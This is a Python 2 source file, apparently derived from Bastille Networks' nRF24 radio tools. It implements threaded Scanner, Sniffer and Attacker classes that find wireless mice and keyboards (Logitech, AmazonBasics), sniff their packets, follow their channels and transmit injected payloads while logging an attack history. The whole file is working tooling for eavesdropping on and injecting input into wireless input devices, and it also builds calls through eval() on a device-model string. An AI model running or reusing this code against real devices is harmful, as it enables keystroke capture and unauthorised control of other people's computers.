#!/usr/bin/env python2
'''
  Copyright (C) 2016 Bastille Networks

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''


import time, logging
from lib import common


import threading
from devices.device import Device, match_device
from devices import amazonbasics, logitech_mouse
from array import array

# common.init_args('./nrf24-scanner.py')
# common.parser.add_argument('-p', '--prefix', type=str, help='Promiscuous mode address prefix', default='')
# common.parser.add_argument('-d', '--dwell', type=float, help='Dwell time per channel, in milliseconds', default='100')

class Scanner(threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.devices = []
  def setup(self):
    # self.devices = []
    # self.devices.append(Device(array('B', [0x98, 0xA3, 0x24, 0x69, 0x07]), 0, [], 'Test'))
    # Parse the prefix addresses
    prefix = ''
    prefix_address = prefix.replace(':', '').decode('hex')
    if len(prefix_address) > 5:
      raise Exception('Invalid prefix address: {0}'.format(prefix))
    # Put the radio in promiscuous mode
    common.radio.enter_promiscuous_mode(prefix_address)
  def run(self):
    self.setup()
    # Convert dwell time from milliseconds to seconds
    dwell = 100
    dwell_time = dwell / 1000
    # Set the initial channel
    common.radio.set_channel(common.channels[0])
    # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    last_tune = time.time()
    channel_index = 0

    while not self._stopevent.isSet():
      # Increment the channel
      if len(common.channels) > 1 and time.time() - last_tune > dwell_time:
        channel_index = (channel_index + 1) % (len(common.channels))
        common.radio.set_channel(common.channels[channel_index])
        last_tune = time.time()

      # Receive payloads
      value = common.radio.receive_payload()
      if len(value) >= 5:
        # Split the address and payload
        address, payload = value[0:5], value[5:]
        channel = common.channels[channel_index]
        payloads = []
        # Search in devices list
        for i in range(len(self.devices)):
          if address == self.devices[i].address:
            if self.devices[i].model == None:
              payloads = self.devices[i].payloads
              # Append payload if its length is not zero
              if len(payload) > 0:
                payloads.append(payload)
              self.devices[i] = match_device(address, channel, payloads)
            else:
              self.devices[i].channel = channel
            break
        else:
          if len(payload) > 0:
            payloads.append(payload)
          self.devices.append(Device(address, channel, payloads))
      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
  def resume(self):
    if not self._flag.isSet():
      self.setup()
      self._flag.set()
  def get_devices(self):
    return self.devices


class Sniffer(threading.Thread):
  def __init__(self, address=[0]*5, moduler=None):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.address = address
    self.moduler = moduler
    self.payload = None
    self.channel = 0
    self.payloads = []
  def setup(self):
    self.payload = None
    # Parse the address
    address = ''.join('{:02X}'.format(b) for b in self.address).decode('hex')[::-1][:5]
    # Put the radio in sniffer mode (ESB w/o auto ACKs)
    common.radio.enter_sniffer_mode(address)
  def run(self):
    self.setup()
    # Convert channel timeout from milliseconds to seconds
    timeout = 0.1
    # Parse the ping payload
    ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')
    # Format the ACK timeout and auto retry values
    ack_timeout = 0
    ack_timeout = max(0, min(ack_timeout, 15))
    retries = max(0, min(1, 15))
    # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    last_ping = time.time()
    channel_index = 0

    while not self._stopevent.isSet():
      success = True
      # Follow the target device if it changes channels
      if time.time() - last_ping > timeout:
        # First try pinging on the active channel
        if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):
          # Ping failed on the active channel, so sweep through all available channels
          success = False
          for channel_index in range(len(common.channels)):
            common.radio.set_channel(common.channels[channel_index])
            if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
              # Ping successful, exit out of the ping sweep
              last_ping = time.time()
              success = True
              break
        # Ping succeeded on the active channel
        else:
          last_ping = time.time()
      # Receive payloads
      if success:
        value = common.radio.receive_payload()
        if value[0] == 0:
          # Reset the channel timer
          last_ping = time.time()
          # Split the payload from the status byte
          self.payload = value[1:]
          self.channel = common.channels[channel_index]
          self.payloads.append(self.payload)
            # Decode here and pass values to the main thread -> sniff
      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
    self.moduler = None
    self.payloads = []
  def resume(self, address=None, moduler=None):
    if not self._flag.isSet():
      if address != None: self.address = address
      if moduler != None: self.moduler = moduler
      self.setup()
      self._flag.set()
  def get_msg(self):
    payload = array('B', [])
    if len(self.payloads) > 0:
      payload = self.payloads[0]
      del self.payloads[0]
    msg = []
    msg.append('{0:<10}{1}'.format('Channel: ', self.channel))
    msg.append('')
    for m in eval('{0}.decode'.format(self.moduler))(payload):
      msg.append(m)
    return msg


class Attacker(threading.Thread):
  def __init__(self, device=None):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.device = device
    self.payloads = []
    self.records = []
  def setup(self):
    self.payloads = []
    self.records = []
    # Parse the prefix addresses
    address = ''.join('{:02X}'.format(b) for b in self.device.address).decode('hex')[::-1][:5]
    # Put the radio in promiscuous mode
    common.radio.enter_sniffer_mode(address)
  def run(self):
    self.setup()
    # Convert channel timeout from milliseconds to seconds
    timeout = 0.1
    # Parse the ping payload
    ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')
    # Format the ACK timeout and auto retry values
    ack_timeout = 0
    ack_timeout = max(0, min(ack_timeout, 15))
    retries = max(0, min(1, 15))
    # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    last_ping = time.time()
    channel_index = 0

    while not self._stopevent.isSet():
      success = True
      # Follow the target device if it changes channels
      if time.time() - last_ping > timeout:
        # First try pinging on the active channel
        if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):
          # Ping failed on the active channel, so sweep through all available channels
          success = False
          for channel_index in range(len(common.channels)):
            common.radio.set_channel(common.channels[channel_index])
            if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
              # Ping successful, exit out of the ping sweep
              last_ping = time.time()
              success = True
              break
            if not self._flag.isSet(): break
        # Ping succeeded on the active channel
        else:
          last_ping = time.time()
      # Send payload if ping is successful
      if success:
        if len(self.payloads) > 0:
          # Get a new payload
          payload = None
          payload = self.payloads[0]
          payload = ':'.join('{:02X}'.format(b) for b in payload)
          del self.payloads[0]
          # self.msg = 'Sending payload {0} on channel {1}'.format(payload, common.channels[channel_index])
          self.records.append([common.channels[channel_index], payload])
          # Send the payload
          payload = payload.replace(':', '').decode('hex')
          common.radio.transmit_payload(payload)
        else:
          # self.msg = 'Waiting for new requests...'
          pass
      else:
        # self.msg = 'Locating device\'s channel...'
        pass
      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
  def resume(self, device):
    if not self._flag.isSet():
      if device != None: self.device = device
      self.setup()
      self._flag.set()
  def set_commands(self, commands):
    try:
      for payload in eval('{0}.encode'.format(self.device.moduler))(commands, self.device):
        self.payloads.append(payload)
    except Exception as e:
      self.records.append(['Error', str(e)])
      # pass
    
    # self.payloads.append(array('B', [0, 0xC2, 0x01, 0, 0, 0, 0, 0, 0, 0x3D]))
    # self.payloads.append(array('B', [0, 0x4F, 0, 0, 0x6E, 0, 0, 0, 0, 0x43]))
  def get_msg(self):
    msg = []
    msg.append('----------------------------------ATTACK HISTORY--------------------------------')
    msg.append('{0:<6}{1:<10}{2}'.format('No.', 'Channel', 'Payload'))
    l = len(self.records)
    ls = l > 10 and l-10 or 0
    for i in range(ls, l):
      msg.append('{0:<10}{1:<10}{2}'.format(i+1, self.records[i][0], self.records[i][1]))
    return msg